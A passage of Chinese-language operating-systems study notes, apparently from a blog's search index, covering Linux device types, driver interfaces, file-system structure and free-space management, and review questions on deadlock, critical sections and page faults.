alt="image-20220102134627709"></li></ul></li><li><p><code>Linux</code>设备分类</p><ul><li>字符设备<ul><li>以字节为单位逐个进行<code>IO</code>操作</li><li>字符设备中的缓存是可有可无的</li><li>不支持随机访问</li><li>如串口设备</li></ul></li><li>块设备<ul><li>块设备的存取是通过<code>buffer</code>、<code>cache</code>来进行</li><li>可以进行随机访问</li><li>例如：<code>IDE</code>硬盘设备</li><li>支持可安装文件系统</li></ul></li><li>网络设备<ul><li>通过<code>BSD</code>套接口访问</li></ul></li></ul></li><li><p>设备文件</p><ul><li>将设备作为文件看待</li><li>使用文件接口打开、关闭、读写和<code>IO</code>控制设备<ul><li>字符设备和块设备通过设备文件访问</li><li><code>Linux</code></li></ul></li><li>主设备号和次设备号<ul><li>主设备号<ul><li>标识该设备种类，标识驱动程序</li><li>主设备号范围：<code>1</code>-<code>255</code></li><li><code>Linux</code>内核支持动态分配主设备号</li></ul></li><li>次设备号<ul><li>标识同一设备驱动程序的不同硬件设备</li><li>次设备号只在驱动程序内部使用</li></ul></li></ul></li></ul></li><li><p>驱动程序的基本接口</p><ul><li><p>面向用户程序的接口</p></li><li><p>面向<code>IO</code>管理器的接口</p><ol><li>注册函数</li><li>注销函数</li><li>数据结构</li><li>请求队列</li></ol></li><li><p>面向设备的接口</p><ul><li>把用户请求转化为端口操作<code>IN/OUT</code></li></ul><ol><li>无条件传送</li><li>查询传送</li><li>中断传送</li><li><code>DMA</code>传送</li></ol></li></ul></li></ul><h1 id="第九章-文件系统"><a href="#第九章-文件系统" class="headerlink" title="第九章 文件系统"></a>第九章 文件系统</h1><h2 id="文件和文件系统的概念"><a href="#文件和文件系统的概念" class="headerlink" title="文件和文件系统的概念"></a>文件和文件系统的概念</h2><ul><li><p>文件的定义</p><ul><li>文件是系统中信息存放的一种组织形式<ul><li>文件是若干信息项的构成<ul><li>信息项可以是字节，可以是结构化数据</li></ul></li><li>用户通过读写指针来存取文件的信息项</li><li>文件具有文件名，用户通过文件名存取文件</li></ul></li></ul></li><li><p>文件分类</p><ul><li><p>按文件的用途</p></li><li><p>系统文件</p><ul><li>包括操作系统的可执行程序和数据文件，这种文件不对用户开发，仅供系统使用</li></ul></li><li><p>库文件</p><ul><li>系统为用户提供的各种标准函数库和实用程序等，用户只能使用这些文件，而无权进行修改</li></ul></li><li><p>用户文件</p><ul><li>用户创建的文件，如用户可执行文件，源程序，数据文件等</li></ul><hr></li><li><p>按文件的操作权限</p></li><li><p>只读文件</p></li><li><p>读写文件</p></li><li><p>不保护文件</p><hr></li><li><p>按文件的性质</p></li><li><p>普通文件</p><ul><li>指一般的用户文件或系统文件</li></ul></li><li><p>目录文件</p><ul><li>由目录项组成的文件</li><li>目录项：文件名，文件属性，文件存放地址</li></ul></li><li><p>设备文件</p><ul><li>把设备作为文件管理和使用</li></ul></li></ul></li></ul><h2 id="文件的逻辑结构"><a href="#文件的逻辑结构" class="headerlink" title="文件的逻辑结构"></a>文件的逻辑结构</h2><ul><li>文件的结构<ul><li>逻辑结构<ul><li>为用户提供逻辑结构清晰、使用方便的文件</li><li>强调文件信息项的构成方式和用户的存取方式</li></ul></li><li>物理结构<ul><li>文件在存储设备上的存储结构</li><li>强调合理利用存储空间，缩短<code>IO</code>存取时间</li></ul></li></ul></li><li>文件的逻辑结构<ul><li>流式文件<ul><li>信息项是字节，文件长度就是字节的数量</li><li>优点<ul><li>文件无需额外的说明信息或控制信息</li><li>节省存储空间</li></ul></li></ul></li><li>记录式文件<ul><li>信息项由记录组成，一个记录包含若干成员<ul><li>学生记录：姓名，学号，性别，成绩</li><li>学生花名册文件：包含若干个学生记录</li></ul></li><li>特点<ul><li>文件中需保存记录长度和数量等说明信息</li><li>浪费存储空间</li></ul></li></ul></li><li>现代<code>OS</code>中文件是流式文件</li></ul></li><li>文件的存取方法<ul><li>顺序存取<ul><li>按文件信息单位排列的顺序依次存取</li><li>读写指针</li></ul></li><li>随机存取<ul><li>直接存取</li><li>每次存取操作时先确定存取位置</li></ul></li></ul></li></ul><h2 id="文件的物理结构"><a href="#文件的物理结构" class="headerlink" title="文件的物理结构"></a>文件的物理结构</h2><ul><li>文件的物理结构<ul><li>文件的物理结构是指文件在存储设备上的存储方式，强调合理利用存储空间，缩短<code>IO</code>存取时间</li></ul></li><li>物理结构的类型<ul><li>连续文件<ul><li>文件按照逻辑顺序存放在存储设备的连续物理块中</li></ul></li><li>串联文件<ul><li>文件信息存放在不连续的存储块中</li><li>每个存储块有一个指针，指向文件的下一个逻辑块所在的存储块</li></ul></li><li>索引文件<ul><li>文件存放在不连续的物理块中，系统建立索引表记录文件的逻辑块和存储块的对应关系</li></ul></li></ul></li></ul><h2 id="文件存储空间管理"><a href="#文件存储空间管理" class="headerlink" title="文件存储空间管理"></a>文件存储空间管理</h2><ul><li>概念<ul><li>记录当前磁盘的使用情况，创建文件时分配存储空间，删除文件时收回存储空间</li></ul></li><li>记录磁盘空闲块的方法<ul><li>空闲文件目录</li><li>空闲块链</li><li>位示图</li></ul></li><li>空闲文件目录<ul><li>一片连续的空闲区当作一个特殊文件：空闲文件，该文件由多个连续的空闲存储块组成</li><li>所有的空闲文件代表存储设备的空闲空间</li><li>空闲文件目录<ul><li>记录所有空闲文件的目录，每个表项对应一个空闲文件</li></ul></li></ul></li><li>空闲块链<ul><li>把存储设备上的所有空闲块链接在一起，当申请者需要空闲块时，分配程序从链头开始摘取所需要的空闲块，然后调整链首指针，反之当回首空闲块时，把释放的空闲块逐个加载链尾上</li></ul></li><li>位示图<ul><li>从内存中划出若干个字节，每位对应一个存储块<ul><li>该位为1：对应存储块空闲</li><li>该位为0：对应存储块已分配</li></ul></li></ul></li></ul><h2 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h2><ul><li>文件目录<ul><li>文件名址录，记录文件名和存放地址的目录表</li><li>为了对大量文件进行分门别类的管理，提高文件检索的效率，现代操作系统往往将文件的一些属性也记录在目录中</li></ul></li><li>目录文件<ul><li>文件目录以文件形式存于外存，这个文件叫目录文件</li></ul></li><li>文件目录的功能：将文件名转换为外存物理地址的功能</li><li>文件的全名：包括从根目录开始到文件为止的通路上所有子目录路径</li><li>每个文件有唯一的路径名</li><li>两种路径名形式<ul><li>绝对路径名</li><li>相对路径名</li></ul></li></ul><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><ul><li>多道批处理系统为什么工作效率比单道的高<ul><li>因为多道批操作系统在内存中存放了多道程序，当某程序因某种原因不能运行放弃<code>CPU</code>时，操作系统调度另一程序投入运行，让<code>CPU</code>尽量忙碌，提高系统效率，而单道批处理系统只能让<code>CPU</code>空闲等待</li></ul></li><li>常见的虚拟机软件能不能理解为操作系统<ul><li>不能，虚拟机只是允许在当前操作系统上运行其他的操作系统，是运行在当前操作系统之上的，是一个应用程序</li></ul></li><li>临界区设计太小或太大有何缺点<ul><li>在保证功能的条件下应该设计的小一些</li><li>临界区太大，会使得其他想要访问临界区的进程等待时间过长，致使并发性变差</li><li>临界区太小，可能导致临界资源不在临界区内，程序并发执行产生混乱</li></ul></li><li>临界区访问机制为什么要实现让权等待原则，锁机制为什么没有满足该原则<ul><li>让权等待原则是指让等待的进程放弃<code>CPU</code>资源，把资源让给其他进程，避免了<code>CPU</code>资源的浪费，提高<code>CPU</code>的利用率</li><li>锁机制的等待程序在未被允许进入临界区之前，一直处于死循环状态，一直占用<code>CPU</code></li></ul></li><li>如何理解参与死锁的进程至少有2个已经占有资源<ul><li>如果参与死锁的进程只有一个占用资源，那么这个占有资源的进程可以继续获取需要的资源，并在有限时间内执行完成，释放占有的资源供其他需要程序的进程使用，这种情况下此进程为发生死锁，产生矛盾；因此参与死锁的进程至少有两个占用资源。</li></ul></li><li>如何证明“按有序资源分配法分配资源并发运行进程不会死锁”<ul><li>有序资源分配法破坏了死锁的环路条件：即<code>A</code>资源使用者等待B资源，B资源使用者等待A资源，形成死锁</li><li>有序资源分配法对资源进行编号，规定进程必须按照编号顺序申请资源，即必须先申请A资源才能申请B资源，那么就不会出现B资源被获取而在等待A资源的情况，所以不会产生死锁</li></ul></li><li>如何理解参与死锁的进程都在等待资源<ul><li>如果某个参与死锁的进程不在等待资源，那么它就会在有限时间内执行完成，并释放占用的资源，即此进程未参与死锁</li></ul></li><li>试述缺页中断的概念和缺页中断响应的过程<ul><li>在地址映射过程中，当所要访问的目的页不在内存中，则系统产生缺页中断</li><li>中断处理程序把所缺的页从页表指定的辅助存储器地址调入内存的某个页框中，并更新页表对应项，修改中断位为0</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> os </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
